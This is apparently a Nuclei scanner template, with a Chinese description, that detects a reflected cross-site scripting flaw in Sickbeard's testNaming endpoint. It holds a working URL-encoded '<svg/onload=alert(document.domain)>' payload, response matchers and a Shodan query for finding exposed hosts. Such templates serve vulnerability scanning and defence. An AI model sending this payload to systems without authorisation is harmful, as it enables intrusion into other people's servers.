id: sick-beard-xss

info:
  name: Sickbeard - 跨站脚本漏洞
  author: pikpikcu
  severity: high
  description: Sickbeard - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://sickbeard.com/
    - https://github.com/midgetspy/Sick-Beard
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  metadata:
    max-request: 1
    shodan-query: sickbeard
  tags: xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - <svg/onload=alert(document.domain)>
        part: body

      - type: word
        words:
          - "text/html"
        part: header
